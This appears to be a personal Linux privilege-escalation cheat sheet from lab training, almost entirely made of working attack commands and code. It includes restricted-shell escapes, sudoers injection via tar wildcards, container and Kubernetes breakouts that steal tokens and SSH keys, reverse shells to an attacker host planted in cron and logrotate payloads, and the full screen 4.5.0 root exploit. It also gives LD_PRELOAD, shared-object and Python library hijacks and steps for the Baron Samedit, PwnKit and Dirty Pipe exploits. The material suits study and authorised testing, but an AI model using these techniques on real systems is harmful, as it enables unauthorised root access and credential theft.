# Linux Privilege Escalation

### Enumeration

```shell
bash -i # interactive shell
ps aux | grep root
ps au
ls /home
ls /home/<username>
history
sudo -l
ls -l ~/.ssh
cat /etc/passwd
ls -la /etc/cron.daily

# Mounted drivers
lsblk
df -h # mounted file systems
cat /etc/fstab | grep -v "#" | column -t # unmounted file systems

# Wriitable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# Writable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# all hidden directories
find / -type d -name ".*" -ls 2>/dev/null

# temporary files
ls -l /tmp /var/tmp /dev/shm


cat /etc/os-release
echo $PATH
env
uname -a
lscpu
cat /etc/shells
cat /etc/fstab
route
arp -a

# users
cat /etc/passwd | cut -f1 -d:

# users with login shells
grep "sh$" /etc/passwd

cat /etc/group
getent group sudo


ip a
cat /etc/hosts
lastlog  # last logins
w # logged in users

# finding history files
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null


find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# installed packages
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

sudo -v

# bianries
ls -l /bin /usr/bin/ /usr/sbin/

# GTFObins
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

strace ping -c1 10.129.112.20

# find config files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

# find scripts
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

---

### Credential Hunting

```shell
grep 'DB_USER\|DB_PASSWORD' wp-config.php
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
```

---

### Path Abuse

```shell
echo $PATH
pwd  && conncheck

PATH=.:${PATH}
export PATH
echo $PATH

touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
ls
```

---

### Wildcard abuse

```shell
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
ls -la
sudo -l
```

---

### escape restricted shell

```shell
From ssh >
ssh username@IP -t "/bin/sh" or "/bin/bash"

From ssh2 >
ssh username@IP -t "bash --noprofile"

From ssh3 >
ssh username@IP -t "() { :; }; /bin/bash"   # (shellshock)

From ssh4 >
ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1   # (SUID)

From git >
git help status > you can run it then !/bin/bash

From pico >
pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T

From zip >
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"

From tar >
tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash

ls -l `pwd` 
```

---

### Permission Based Escalation

```shell
# Find SUID/ setuid bits taht when ran runs as te owner
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find GUID/ groupID that whenn run executes as the group
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null


# Sudo Rights Abuse
sudo -l

# Privileged Groups
id
unzip alpine.zip
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
grep -rw "flag" /var/log 2>/dev/null

# Capabilities
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

getcap /usr/bin/vim.basic
cat /etc/passwd | head -n1
/usr/bin/vim.basic /etc/passwd
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1
```

---

### Service-Based Privelege Escalation

```shell
screen -v
./screen_exploit.sh


#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell


# Cron Job Abuse
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
ls -la /dmz-backups/
./pspy64 -pf -i 1000
cat /dmz-backups/backup.sh

echo 'bash -i >& /dev/tcp/PWNIP/443 0>&1' >> /dmz-backups/backup.sh

nc -lnvp 443


# Containers
id   ## if lxd  we are in a container
cd ContainerImages
ls
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/root path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash


# Docker
id # if docker  we are in a container
cd /hostsystem/home/cry0l1t3
ls -l
cat .ssh/id_rsa
ssh cry0l1t3@<host IP> -i cry0l1t3.priv

ls -al
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
ls -l
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
cat /hostsystem/root/.ssh/id_rsa
id
docker image ls

##exploit
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# Kubebrnetes

curl https://10.129.10.11:6443 -k
curl https://10.129.10.11:10250/pods -k | jq .
kubeletctl -i --server 10.129.10.11 pods
kubeletctl -i --server 10.129.10.11 scan rce
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

##extracting token
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

##extracting certificates
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc


# Logrotate
logrotate --help
cat /etc/logrotate.conf
sudo cat /var/lib/logrotate.status
ls /etc/logrotate.d/
cat /etc/logrotate.d/dpkg
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
nc -nlvp 9001

./logrotten -p ./payload /tmp/tmp.log
echo test >> /home/htb-student/backups/access.log; ./logrotten /home/htb-student/backups/access.log -p payload


# Miscellaneous
showmount -e 10.129.2.12
cat /etc/exports
cat shell.c


#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
ls -la
./shell
id

##tmux
tmux -S /shareds new -s debugsess
chown root:devs /shareds
ps aux | frep tmux
ls -la /shareds
id
tmux -S /shareds
```

---

### Linux Internals-based Privilege Escalation

```shell
# Kernel Exploits
uname -a
cat /etc/lsb-release
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
whoami


#Shared Libraries
ldd /bin/ls
sudo -l # look for LD_PRELOAD

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=./root.so /usr/sbin/apache2 restart # the last part is the command we can run as sudo


# Shared Object Hijacking
ls -la payroll
ldd payroll
readelf -d payroll  | grep PATH
ls -la /development/
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 


gcc src.c -fPIC -shared -o /development/libshared.so
./payroll 


# Python Library Hijacking
ls -l mem_status.py
pip3 show psutil
ls -la /usr/lib/python3.8

#
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
#

grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
sudo /usr/bin/python3 ./mem_status.py
python3 -c 'import sys; print("\n".join(sys.path))'

#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')

sudo /usr/bin/python3 mem_status.py

##PythonPath
sudo -l
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

```

---

### Recent 0 days

```shell
# Sudo
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
sudo -V | head -n1
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
cat /etc/lsb-release
./sudo-hax-me-a-sandwich 1
sudo -l
cat /etc/passwd | grep cry0l1t3
sudo -u#-1 id
sudo -u#-1 /bin/ncdu

# Polkit
pkexec -u root id
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc

# Dirty Pipe
./
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
uname -r
./exploit-1
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo
```
